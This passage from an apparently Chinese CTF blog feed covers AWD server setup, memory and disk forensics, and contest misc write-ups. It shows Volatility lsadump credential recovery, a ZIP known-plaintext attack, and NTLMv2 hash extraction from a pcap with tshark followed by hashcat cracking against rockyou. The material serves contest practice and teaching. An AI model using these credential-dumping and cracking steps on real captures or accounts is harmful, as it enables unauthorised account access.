        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a><u>前言</u></h1><p>哎，，再次感到misc果然还是要会点web或者re才行</p><p>这个awd会给你一个服务器需要你ssh连接起来，连起来之后需要tar下html里面的东西，然后查杀漏洞，维护，攻击别人的。</p><h1 id="以bugku的awd为例"><a href="#以bugku的awd为例" class="headerlink" title="以bugku的awd为例"></a><u>以bugku的awd为例</u></h1><p>报名比赛后能得到一些东西，比如ip白名单，账号密码，token，虚拟ip等</p><p>ip白名单——队长加的队员ip</p><p>账号密码——一会连ssh有用（以<code>：</code>分隔）</p><p>token——提交flag时用</p><p>虚拟ip——连ssh，注意端口是2222</p><h2 id="使用Tabby连接"><a href="#使用Tabby连接" class="headerlink" title="使用Tabby连接"></a>使用Tabby连接</h2><p>项目地址： <a href="https://tabby.sh/">https://tabby.sh/</a> 注意要下windows的（tabby基础讲解： <a href="https://blog.csdn.net/weixin_45417821/article/details/122579794?ops_request_misc=%257B%2522request%255Fid%2522%253A%25223a71448c947f5696c8f39480ad809de2%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=3a71448c947f5696c8f39480ad809de2&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-122579794-null-null.142%5Ev100%5Epc_search_result_base8&utm_term=tabby&spm=1018.2226.3001.4187">这里</a>）</p><p>打开后点开<code>设置/配置与连接</code></p><img src="屏幕截图 2024-12-20 231606.png" alt="屏幕截图 2024-12-20 231606" style="zoom:75%;"><p>点击<code>新建/新配置</code>，选择<code>ssh连接</code></p><p>看到一个空白页面，填写：</p><p>名称—主机—端口—用户名—密码</p><p>如下：</p><img src="屏幕截图 2024-12-20 231918.png" alt="屏幕截图 2024-12-20 231918" style="zoom:75%;"><p>然后点击新建页面旁边的那个框框，再选择刚刚建的ssh就可以开始连接了</p><img src="屏幕截图 2024-12-20 232210.png" alt="屏幕截图 2024-12-20 232210" style="zoom:75%;"><p>等一会就连接成功了</p><h3 id="SFTP传输工具"><a href="#SFTP传输工具" class="headerlink" title="SFTP传输工具"></a>SFTP传输工具</h3><p>tabby是自带sftp工具的，连接成功后在右上角就能看到</p><p>点开后能弹出服务器上的目录，如果想下载里面的一些东西可以直接点击会出现保存文件的提示，然后保存就行</p><p>如果想上传文件可以直接拖拽文件，也能点右上角的<code>upload</code></p><h3 id="html相关下载——tar命令"><a href="#html相关下载——tar命令" class="headerlink" title="html相关下载——tar命令"></a>html相关下载——tar命令</h3><p>连接成功之后可以打包下载html里的东西了，在<code>var/www/html</code>里。</p><p>但是html是无法直接下的，那怎么办呢？使用<code>tar</code>命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">tar -czvf myfolder.tar.gz /var/www/html/*</span><br><span class="line"># 这个命令会打包html里的所有东西</span><br><span class="line">tar -czvf web.tar.gz ./*</span><br><span class="line"># 打包当前目录下所有东西到当前文件夹下</span><br></pre></td></tr></table></figure><p>打包完成的东西在<code>home</code>的一个文件夹里（这里是忘了具体在哪了。。）</p><p>然后就能看到一个<code>myfolder.tar.gz</code>或者<code>web.tar.gz</code>，直接点击保存下来就好</p><h3 id="查找漏洞-修改-上传"><a href="#查找漏洞-修改-上传" class="headerlink" title="查找漏洞+修改+上传"></a>查找漏洞+修改+上传</h3><p>保存下来的html文件夹可以用<code>D盾</code>来扫描漏洞，然后找到对应漏洞，修改。</p><p>这里可以直接在tabby上的服务器文件里修改，或者本地修改完再上传到服务器上</p><p>改完漏洞就能加固我们的防御了。</p><h3 id="沙箱跑木马"><a href="#沙箱跑木马" class="headerlink" title="沙箱跑木马"></a>沙箱跑木马</h3><p>我们可以利用在线沙箱来跑恶意代码，顺便让它帮我们分析一下</p><p>安恒云沙箱： <a href="https://sandbox.dbappsecurity.com.cn/">安恒云沙箱-下一代沙箱的领航者</a></p><p>如果是哥斯拉，蚁剑，冰蝎，天蝎，之类的常规工具可以直接分析出来</p><h3 id="apache日志分析"><a href="#apache日志分析" class="headerlink" title="apache日志分析"></a>apache日志分析</h3><blockquote><p><strong>常见日志文件位置</strong></p></blockquote><blockquote><ol><li>Apache日志<ul><li><strong>访问日志</strong> ：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;access_log.1（CentOS&#x2F;RHEL）。</li><li><strong>错误日志</strong> ：默认位置通常是&#x2F;var&#x2F;log&#x2F;apache2&#x2F;error.log.1（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;httpd&#x2F;error_log.1（CentOS&#x2F;RHEL）。</li></ul></li><li>SSH日志<ul><li><strong>身份验证日志</strong> ：通常位于&#x2F;var&#x2F;log&#x2F;auth.log（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;secure（CentOS&#x2F;RHEL）。</li></ul></li><li>系统日志<ul><li><strong>系统日志</strong> ：通常位于&#x2F;var&#x2F;log&#x2F;syslog（Debian&#x2F;Ubuntu）或&#x2F;var&#x2F;log&#x2F;messages（CentOS&#x2F;RHEL）。</li></ul></li></ol></blockquote><p>我们可以进入<code>/var/log/apache2</code>日志目录。</p><p>可以dump下来分析，也可以直接在上面筛选</p><p>需要一定的linux知识</p><blockquote><ol><li>cut: 这是一个命令，用于从每一行文本中剪切出指定部分。<ul><li>-d-: 指定分隔符为 -</li><li>-f 1: 指定要剪切的字段为第一个字段。</li><li>access.log.1: 这是要处理的日志文件的文件名或路径。</li></ul></li><li>uniq -c: 这个命令会从输入中删除重复的行，并且计算每行重复出现的次数。<ul><li>-c: 会在输出中显示每行重复出现的次数。</li></ul></li><li>sort : 这个命令会对输入进行排序。<ul><li>-r: 表示反向排序，即降序排列。</li><li>-n: 表示按照数值大小排序。</li></ul></li><li>head -20: 最后，这个命令会从排序后的结果中提取前 20 行。</li><li>| : 管道命令符，表示前一项的输出结果作为后一项的输入</li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> AWD </category>
          
      </categories>
      
      
        <tags>
            
            <tag> awd </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>newstar2024小明同学们复现</title>
      <link href="/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/12/newstar2024%E5%B0%8F%E6%98%8E%E5%90%8C%E5%AD%A6%E4%BB%AC%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>主要最近发现自己的取证题目比较薄弱，于是拿小明同学们练练手。</p><h1 id="1-热心助人的小明同学"><a href="#1-热心助人的小明同学" class="headerlink" title="1.热心助人的小明同学"></a><u>1.热心助人的小明同学</u></h1><p>这个很简单，只要装好vol2，然后lsadump看密码就好</p><p>先看操作版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vol.py -f image.raw imageinfo</span><br></pre></td></tr></table></figure><img src="屏幕截图 2024-12-20 140254.png" alt="屏幕截图 2024-12-20 140254" style="zoom:67%;"><p>看到操作版本是 Win7SP1x86_23418</p><p>然后直接lsadump就好</p><img src="屏幕截图 2024-12-20 140511.png" alt="屏幕截图 2024-12-20 140511" style="zoom:75%;"><p>密码：ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh（开头的0x48不是密码）</p><p>所以flag：flag{ZDFyVDlfdTNlUl9wNHNTdzByRF9IQUNLRVIh}</p><h1 id="2-擅长音游的小明同学"><a href="#2-擅长音游的小明同学" class="headerlink" title="2.擅长音游的小明同学"></a><u>2.擅长音游的小明同学</u></h1><p>拿到一个chal_fixed.E01文件，使用FTK挂载 （最好用4.2版本的</p><p>在win7那个下面的<code>root/users/desktop</code>可以看到</p><img src="屏幕截图 2025-01-04 210938.png" alt="屏幕截图 2025-01-04 210938" style="zoom:75%;"><blockquote><p>[!NOTE]</p><p>真相.txt</p><p>真相会不经意间流入日常的点点滴滴……<br>真相在哪里?</p></blockquote><blockquote><p>[!NOTE]</p><p>要开始了呦.txt</p><p>今天舞萌彩框了好开心啊o(<em>￣▽￣</em>)ブ<br>我要把这一刻用照片保存下来<br>不过在拍摄rating变化的瞬间总感觉有什么东西藏进照片里了<br>打开也没发现什么异常，但是体积好像变大了一点<br>是错觉吗？</p></blockquote><p>可以发现跟图片有关，而在照片文件里面找到ColorfulDog.jpg</p><img src="屏幕截图 2025-01-04 211404.png" alt="屏幕截图 2025-01-04 211404" style="zoom:75%;"><p>没啥思路了binwalk一下（感觉挺正常的</p><p>发现一个txt内容是：</p><p>听好了听好了听好了听好了听好了听好了听好了： 1919年8月10日，世界就此陷落， 陷落的世界都将迎来一场漩涡， 为这个世界带来有关弗拉格尚未知晓的真相。 但发掘真相的道路被加诸混沌的历练 世界的宽高未被正确丈量 当真相被混沌打乱时 真相将不复存在 也许，在世界的重置和轮回中能找到发现真相的方法…… 至此，尘埃落定 至此，一锤定音 #音游# #NewStarcaea# #Misc#</p><p>然后我们挂载这个E01，注意要在FTK上右键加载镜像，进行加载</p><img src="屏幕截图 2025-01-05 132008.png" alt="屏幕截图 2025-01-05 132008" style="zoom:75%;"><p>使用VM挂载一下，注意要用管理员运行。</p><p>这里要选择UEFI</p><img src="屏幕截图 2025-01-05 132348.png" alt="屏幕截图 2025-01-05 132348" style="zoom:75%;"><p>挂载出问题了。。。</p><h1 id="3-擅长加密的小明同学"><a href="#3-擅长加密的小明同学" class="headerlink" title="3.擅长加密的小明同学"></a><u>3.擅长加密的小明同学</u></h1><p>拿到了一个vhd和一个君は加密本当に上手だな.zip，解压得到一个raw文件</p><p>vhd双击打开发现要BitLocker解密，我们使用Elcomsoft Forensic Disk Decryptor</p><p>选择<code>decrypt or mount disk / image file of disk\partition</code></p><img src="屏幕截图 2025-01-05 144711.png" alt="屏幕截图 2025-01-05 144711" style="zoom:50%;"><p>进行恢复，得到key：408320-285065-614779-610940-547107-218229-492195-125422</p><p>输入恢复密钥之后得到了一个flag.7z，解压需要密码。</p><p>7z在密码复杂的情况下几乎不可能被爆破出来，所以我们看raw文件。</p><p>查看操作版本</p><img src="屏幕截图 2025-01-28 161649.png" alt="屏幕截图 2025-01-28 161649" style="zoom:80%;"><p>查看有什么进程</p><img src="屏幕截图 2025-01-28 161823.png" alt="屏幕截图 2025-01-28 161823" style="zoom:80%;"><p>看到有一个mspaint.exe（画图进程），我们提取出来，使用 memdump：</p><img src="屏幕截图 2025-01-28 162129.png" alt="屏幕截图 2025-01-28 162129" style="zoom:80%;"><p>然后改后缀为data，拉入GIMP.</p><p>图像类型选择RGB透明，拉X,Y,Z，最后得到：</p><img src="屏幕截图 2025-01-28 162730.png" alt="屏幕截图 2025-01-28 162730" style="zoom:80%;"><p>压缩包密码：<code>rxnifbeiyomezpplugho</code></p><p>解压出来得到：flag{5ZCb44Gv5Y+W6K+B5pys5b2T44Gr5LiK5omL}</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> misc </tag>
            
            <tag> CTF </tag>
            
            <tag> WP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024浙江省省赛复现</title>
      <link href="/2024/12/2024%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/"/>
      <url>/2024/12/2024%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9B%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="1-2024浙江省赛复现"><a href="#1-2024浙江省赛复现" class="headerlink" title="1.2024浙江省赛复现"></a>1.2024浙江省赛复现</h1><h2 id="1-real-signin"><a href="#1-real-signin" class="headerlink" title="1.real signin"></a>1.real signin</h2><p>得到一张out.png，用zsteg跑一下发现：</p><img src="2024-12-08 135507.png" alt="2024-12-08 135507" style="zoom:75%;"><p>得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dEFfc1dGq1pxMgMWnihrMx9mewNgdvIWMvctrc</span><br></pre></td></tr></table></figure><p>和</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ABCDEFGHIJKLMNabcdefghijklmnopqrstuvwxyzOPQRSTUVWXYZ0123456789+/</span><br></pre></td></tr></table></figure><p>猜测是换表的base64，解密得到flag：DASCTF{We1C0me_2_ZJCTF2024!}</p><h2 id="2-机密文档"><a href="#2-机密文档" class="headerlink" title="2.机密文档"></a>2.机密文档</h2><p>得到一个加密的压缩包，发现加密方式是store，猜测为明文攻击</p><img src="2024-12-08 140955.png" alt="2024-12-08 140955" style="zoom:75%;"><blockquote><p>[!NOTE]</p><p>将一个名为flag.txt的文件打包成ZIP压缩包后，发现文件名称会出现在压缩包文件头中，且偏移固定为30</p><p>且默认情况下，flag.zip也会作为该压缩包的名称</p><p>已知的明文片段有：</p><p>“flag.txt” 8个字节，偏移30</p><p>ZIP本身文件头：50 4B 03 04 ，4字节</p><p>满足12字节的要求</p></blockquote><p>其中 -C 后面跟的是原本的zip，-c 后面跟的是里面需要解密出来的zip，-x 后面是已知的明文，30 表示偏移量，7468655F7365637265745F796F755F6E657665725F657665725F6B6E6F775F6861686168616861是the_secret_you_never_ever_know_hahahaha的16进制转换，即用010打开后看到的。下一个 -x 0 是zip的偏移量，504B0304是zip的16进制表示。</p><p> 可以看到解压出来的keys是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b8edf1ff c1f93a7e f93d08e0</span><br></pre></td></tr></table></figure><p>得到三段密钥就可以修改压缩包密码了：</p><img src="2024-12-08 141849.png" alt="2024-12-08 141849" style="zoom:75%;"><p>修改了密码为123</p><p>解压后得到一个docm文档，猜测是跟宏有关的，wps打开发现</p><img src="2024-12-08 142113.png" alt="2024-12-08 142113" style="zoom:50%;"><p>这里可以使用wps里查看宏，也可以olevba看</p><p>wps 里查看如下：</p><img src="2024-12-08 142319.png" alt="2024-12-08 142319" style="zoom:75%;"><p>olevba 查看如下：</p><img src="2024-12-08 143620.png" alt="2024-12-08 143620" style="zoom:75%;"><p>反正最后得到如下宏代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">Sub key()</span><br><span class="line">    Dim decValues As Variant</span><br><span class="line">    Dim str As String</span><br><span class="line">    Dim result As String</span><br><span class="line">    Dim i As Integer</span><br><span class="line">    Dim xorValue As Integer</span><br><span class="line">    </span><br><span class="line">    decValues = Array(26, 25, 28, 0, 16, 1, 74, 75, 45, 29, 19, 49, 61, 60, 3)</span><br><span class="line">    str = &quot;outguess&quot;</span><br><span class="line">    result = &quot;&quot;</span><br><span class="line"></span><br><span class="line">    For i = LBound(decValues) To UBound(decValues)</span><br><span class="line">        xorValue = decValues(i) Xor Asc(Mid(str, (i Mod Len(str)) + 1, 1))</span><br><span class="line">        result = result &amp; Chr(xorValue)</span><br><span class="line">    Next i</span><br><span class="line"></span><br><span class="line">End Sub</span><br></pre></td></tr></table></figure><p>可以发现是一个异或代码，可以手搓脚本解密，也可以cyberchef</p><p>cyberchef得到如下：</p><img src="2024-12-08 144013.png" alt="2024-12-08 144013" style="zoom:75%;"><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ulhged98BhgVHYp</span><br></pre></td></tr></table></figure><p>由于之前提示了是outguess加密，将docm后缀改为zip后在 word &#x2F; media 里拿到图片 image1.jpeg</p><p>由于outguess不认识jpeg，需要我们修改后缀名为jpg</p><p>![2024-12-08 144645](.&#x2F;2024浙江省省赛复现&#x2F;2024-12-08 144645.png)</p><p>得到flag：DASCTF{B1g_S3CR3t_F0R_Y0u}</p><h2 id="3-EZtraffic"><a href="#3-EZtraffic" class="headerlink" title="3.EZtraffic"></a>3.EZtraffic</h2><p>拿到流量分析一下就可以在SMB里发现有传输流量包，导出一下</p><img src="2024-12-16 225216.png" alt="2024-12-16 225216" style="zoom:75%;"><p>发现有三个压缩包，但是只有其中一个是<code>final_out</code>，即最后的zip</p><p>这里最好不要用foremost和binwalk，因为你会发现导出的压缩包里面会少东西。</p><p>打开压缩包发现</p><img src="2024-12-16 225430.png" alt="2024-12-16 225430" style="zoom:75%;"><p>注释</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">NTLM v2 plaintext + \d&#123;5&#125;</span><br></pre></td></tr></table></figure><p>这里后来才知道需要提取 NTLMv2 哈希值并破解，可以看lunatic师傅的博客 <a href="https://goodlunatic.github.io/posts/5422d65/#ntlm%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90">这里</a></p><p>而且这里 + \d{5} 提示后面再跟五位数字爆破。</p><p>这里可以用tshark导出（tshark是kali自带的）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tshark -n -r eztraffic.pcapng -Y &#x27;ntlmssp.messagetype == 0x00000003&#x27; -T fields -e ntlmssp.auth.username -e ntlmssp.auth.domain -e ntlmssp.ntlmv2_response.ntproofstr -e ntlmssp.auth.sesskey -e smb2.sesid</span><br></pre></td></tr></table></figure><p>得到</p><img src="2024-12-16 230745.png" alt="2024-12-16 230745" style="zoom:75%;"><p>这里我们需要的是<code>username::domain:ServerChallenge:NTproofstring:modifiedntlmv2response</code>并且需要以这个形式保存到txt里</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">rockyou #username</span><br><span class="line">MicrosoftAccount #domain</span><br><span class="line">db12ced50faf52f141636e80205e8f28 #ServerChallenge</span><br><span class="line">66aa2c3634e34e6e330949b82d4d2a64 #NTproofstring</span><br><span class="line">而modifiedntlmv2response需要我们回到流量里找一下</span><br></pre></td></tr></table></figure><p>先过滤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ntlmssp</span><br></pre></td></tr></table></figure><p>可以看到很多流,其中有一个是<code>NTLMSSP_AUTH</code>的</p><p>在里面找<code>NTLMv2 Response</code>，可以看到</p><img src="2024-12-16 235130.png" alt="2024-12-16 235130" style="zoom:75%;"><p>除了<code>NTProofStr</code>以外的就是我们要找的<code>modifiedntlmv2response</code>了（注意这里复制hex值）</p><p>最后得到</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rockyou::MicrosoftAccount:4936df20962cae6d:db12ced50faf52f141636e80205e8f28:01010000000000003604281b951fdb017b4045aa008508eb0000000002001e00440042004500440036004200350041002d0035003100430032002d00340001001e00440042004500440036004200350041002d0035003100430032002d00340004004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d0064006400320062003500370030006400350030003900360003004800640062006500640036006200350061002d0035003100630032002d0034003100650063002d0061006400380034002d00640064003200620035003700300064003500300039003600070008003604281b951fdb01060004000200000008003000300000000000000001000000002000008029a5d8256e5c2762f439df5c06f3bc411fb0faeb3a6fa52d9273c57b09f2d10a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e0031002e00380031000000000000000000</span><br></pre></td></tr></table></figure><p>将以上的内容保存到<code>hash.txt</code>中，用hashcat爆破，命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.\hashcat -m 5600 hash.txt rockyou.txt</span><br><span class="line"># 5600 表示NetNTLMv2模式</span><br><span class="line"># rockyou是github上找的字典，还挺大</span><br></pre></td></tr></table></figure><img src="2024-12-17 002646.png" alt="2024-12-17 002646" style="zoom:67%;"><p>得到密码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">haticehatice</span><br></pre></td></tr></table></figure><p>接下来就是5位掩码爆破了，ARP秒出</p><img src="2024-12-17 003142.png" alt="2024-12-17 003142" style="zoom:50%;"><p>得到密码<code>haticehatice12580</code>，解压压缩包，看到有100张图片碎片，猜测是拼图</p><img src="2024-12-17 133927.png" alt="2024-12-17 133927" style="zoom:75%;"><p>猜测图片应该是有顺序的，不然也太难拼了</p><p>在stegsolve的rad0里看到</p><img src="2024-12-17 134555.png" alt="2024-12-17 134555" style="zoom:50%;"><p>QCR扫一下，看到</p><img src="2024-12-17 135101.png" alt="2024-12-17 135101" style="zoom:50%;"><p>这里需要我们按照顺序一个个的把图片更改一下</p><p>利用脚本拼接一下（脚本抄的。）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> pyzbar.pyzbar <span class="keyword">import</span> decode</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_lsb</span>(<span class="params">imgname</span>):</span><br><span class="line">    r = []</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    width,height = img.size</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(width):</span><br><span class="line">        <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(height):</span><br><span class="line">            pixel = img.getpixel((x,y))</span><br><span class="line">            r.append(<span class="built_in">str</span>(pixel[<span class="number">0</span>] &amp; <span class="number">1</span>))</span><br><span class="line">            <span class="comment"># print(pixel)</span></span><br><span class="line">    bin_data = <span class="string">&#x27;&#x27;</span>.join(r)</span><br><span class="line">    <span class="keyword">return</span> bin_data  </span><br><span class="line">            </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bin2img</span>(<span class="params">bin_data</span>):</span><br><span class="line">    imgname = <span class="string">&quot;tmp.png&quot;</span></span><br><span class="line">    pixels = []</span><br><span class="line">    img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">50</span>,<span class="number">50</span>))</span><br><span class="line">    <span class="keyword">for</span> item <span class="keyword">in</span> bin_data:</span><br><span class="line">        <span class="keyword">if</span> item ==<span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            pixels.append((<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>))</span><br><span class="line">        <span class="keyword">else</span> :</span><br><span class="line">            pixels.append((<span class="number">255</span>,<span class="number">255</span>,<span class="number">255</span>))</span><br><span class="line">    img.putdata(pixels)</span><br><span class="line">    <span class="comment"># img.show()</span></span><br><span class="line">    img = img.resize((<span class="number">500</span>,<span class="number">500</span>)) </span><br><span class="line">    <span class="comment"># 这里调整一下图片的大小，便于后面pyzbar的识别</span></span><br><span class="line">    img.save(imgname)</span><br><span class="line">    <span class="keyword">return</span> imgname</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_qrcode</span>(<span class="params">imgname</span>):</span><br><span class="line">    img = Image.<span class="built_in">open</span>(imgname)</span><br><span class="line">    decode_data = decode(img)</span><br><span class="line">    <span class="comment"># print(decode_data)</span></span><br><span class="line">    res = decode_data[<span class="number">0</span>].data.decode()</span><br><span class="line">    os.remove(imgname)</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line">        </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rename_img</span>():</span><br><span class="line">    filenames = os.listdir(<span class="string">&quot;./final_out&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> filename <span class="keyword">in</span> filenames:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            src_img = <span class="string">&quot;./final_out/&quot;</span>+filename</span><br><span class="line">            bin_data = extract_lsb(src_img)</span><br><span class="line">            imgname = bin2img(bin_data)</span><br><span class="line">            res = read_qrcode(imgname)</span><br><span class="line">            dst_img = <span class="string">f&quot;./final_out/<span class="subst">&#123;res&#125;</span>.png&quot;</span></span><br><span class="line">            os.rename(src_img,dst_img)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;src_img&#125;</span> ===&gt; <span class="subst">&#123;dst_img&#125;</span> down!!!&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[-] <span class="subst">&#123;src_img&#125;</span> Error!!!&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge_img</span>():</span><br><span class="line">    cols = <span class="number">10</span></span><br><span class="line">    rows = <span class="number">10</span></span><br><span class="line">    img_list = []</span><br><span class="line">    new_img = Image.new(<span class="string">&quot;RGB&quot;</span>,(<span class="number">500</span>,<span class="number">500</span>))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        img = Image.<span class="built_in">open</span>(<span class="string">f&quot;./final_out/<span class="subst">&#123;i&#125;</span>.png&quot;</span>)</span><br><span class="line">        img_list.append(img)</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">for</span> y <span class="keyword">in</span> <span class="built_in">range</span>(rows):</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(cols):</span><br><span class="line">            idx = y * cols + x</span><br><span class="line">            img = img_list[idx]</span><br><span class="line">            x_offset = x * <span class="number">50</span></span><br><span class="line">            y_offset = y * <span class="number">50</span></span><br><span class="line">            new_img.paste(img,(x_offset,y_offset))</span><br><span class="line">            </span><br><span class="line">    <span class="comment"># new_img.show()</span></span><br><span class="line">    new_img.save(<span class="string">&quot;flag.png&quot;</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="comment"># rename_img()</span></span><br><span class="line">    merge_img()</span><br></pre></td></tr></table></figure><p>最后得到</p><img src="2024-12-17 135936.png" alt="2024-12-17 135936" style="zoom:50%;"><h2 id="4-FinalSign"><a href="#4-FinalSign" class="headerlink" title="4.FinalSign"></a>4.FinalSign</h2><p>文章能看到的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">2c243f2f3b3114345d0a0909333f06100143023b2c55020912</span><br></pre></td></tr></table></figure><p>可以发现文章里有雪隐写，里面隐写了xor的密码:</p><img src="2024-12-10 110816.png" alt="2024-12-10 110816" style="zoom:75%;"><p>接下来cyberchef就能出了</p><img src="2024-12-10 111131.png" alt="2024-12-10 111131" style="zoom:75%;"><h2 id="5-非黑即白"><a href="#5-非黑即白" class="headerlink" title="5.非黑即白"></a>5.非黑即白</h2><p>得到一个没有后缀的文件，010打开发现是逆序的gif</p><p>利用puzzlesolver逆序回来，得到gif，再拆分一下发现全是黑白图片：</p><img src="2024-12-10 113100.png" alt="2024-12-10 113100" style="zoom:75%;"><p>这里应该是二进制，脚本提取一下（脚本借鉴的。。）:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 